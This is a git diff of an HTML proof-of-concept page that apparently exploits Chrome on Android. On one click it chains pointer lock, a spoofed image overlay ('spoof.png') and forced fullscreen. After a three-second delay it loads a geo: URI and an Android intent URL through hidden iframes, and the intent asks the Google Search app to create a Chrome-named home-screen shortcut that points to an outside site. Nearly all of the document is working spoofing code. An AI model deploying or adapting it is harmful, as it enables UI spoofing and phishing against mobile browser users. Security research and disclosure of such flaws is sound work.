@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
-    <title>Fullscreen First & Delayed Intent PoC</title>
+    <title>Ultimate Chaining & Delayed Intent PoC</title>
     <style>
       body, html {
         margin: 0;
@@ -33,15 +33,15 @@
         padding: 18px 24px;
         font-size: 16px;
         font-weight: 600;
-        background: #1a73e8;
+        background: #da3633;
         color: #fff;
         border: none;
         border-radius: 10px;
         cursor: pointer;
-        box-shadow: 0 4px 14px rgba(26, 115, 232, 0.4);
+        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
         transition: transform 0.1s, background 0.2s;
       }
-      button:active { background: #1557b0; transform: scale(0.98); }
+      button:active { background: #b62324; transform: scale(0.98); }
       .info {
         margin-top: 20px;
         font-size: 13px;
@@ -92,7 +92,7 @@
       <img id="spoof" style="display: none;" src="spoof.png" alt="Spoof Layer">
 
       <div class="container" id="mainContainer">
-        <button id="execBtn">INITIALIZE FULLSCREEN & INTENT</button>
+        <button id="execBtn">INITIALIZE FULL CHAINING & DELAYED INTENT</button>
         <div class="info" id="statusInfo">Status: Ready for interaction.</div>
       </div>
     </div>
@@ -102,25 +102,27 @@
       let statusInfo = document.getElementById("statusInfo");
 
       execButton.onclick = async function () {
-        statusInfo.innerText = "Status: Entering Fullscreen mode...";
+        statusInfo.innerText = "Status: Executing pointer lock & entering fullscreen...";
         this.style.display = "none";
 
         try {
-          // 1. Pointer Lock & Overlay/UI Prep
+          // 1. Chaining Step 1: Pointer Lock Activation
           let plElement = document.getElementById("pointerLockElement");
           if (plElement && plElement.requestPointerLock) {
             await plElement.requestPointerLock().catch((err) => {
-              console.debug("PointerLock catch:", err.message);
+              console.debug("PointerLock chained catch:", err.message);
             });
           }
 
+          // 2. Chaining Step 2: Instan menampilkan visual overlay spoof.png
           let spoofImg = document.getElementById("spoof");
           if (spoofImg) {
             spoofImg.style.display = "block";
           }
 
-          // 2. Eksekusi Fullscreen terlebih dahulu secara instan
+          // 3. Chaining Step 3: Eksekusi Fullscreen terlebih dahulu secara instan
           let fsElement = document.getElementById("fullscreenElement") || document.documentElement;
+
           let requestFS = fsElement.requestFullscreen || 
                           fsElement.webkitRequestFullscreen || 
                           fsElement.mozRequestFullScreen || 
@@ -133,7 +135,7 @@
               try {
                 await requestFS.call(fsElement);
               } catch (e) {
-                console.debug("Fullscreen fallback error:", e.message);
+                console.debug("Fullscreen chain fallback error:", e.message);
               }
             }
           }
@@ -143,20 +145,28 @@
             container.style.display = "none";
           }
 
-          statusInfo.innerText = "Status: Fullscreen active. Intent will trigger in 3 seconds...";
+          statusInfo.innerText = "Status: Fullscreen active. Geo & Android intent will trigger in 3 seconds...";
 
-          // 3. Intent berjalan otomatis setelah jeda waktu 3 detik (3000ms)
+          // 4. Chaining Step 4: Geo URI & Android Intent dispatch otomatis setelah jeda waktu 3 detik
           setTimeout(() => {
-            statusInfo.innerText = "Status: Dispatching Android Intent payload...";
-            
-            let spoofFrame = document.createElement("iframe");
-            spoofFrame.style.display = "none";
-            spoofFrame.src = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
-            document.body.appendChild(spoofFrame);
+            statusInfo.innerText = "Status: Dispatching Geo & Android Intent payloads...";
+
+            // Memanggil geo protocol iframe
+            let geoFrame = document.createElement("iframe");
+            geoFrame.style.display = "none";
+            geoFrame.src = "geo:0,0?q=apple.com";
+            document.body.appendChild(geoFrame);
+
+            // Memanggil Android Intent NDevTK
+            let intentFrame = document.createElement("iframe");
+            intentFrame.style.display = "none";
+            intentFrame.src = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
+            document.body.appendChild(intentFrame);
+
           }, 3000);
 
         } catch (err) {
-          statusInfo.innerText = "Status: Execution error: " + err.message;
+          statusInfo.innerText = "Status: Chaining execution error: " + err.message;
           execButton.style.display = "block";
         }
       };
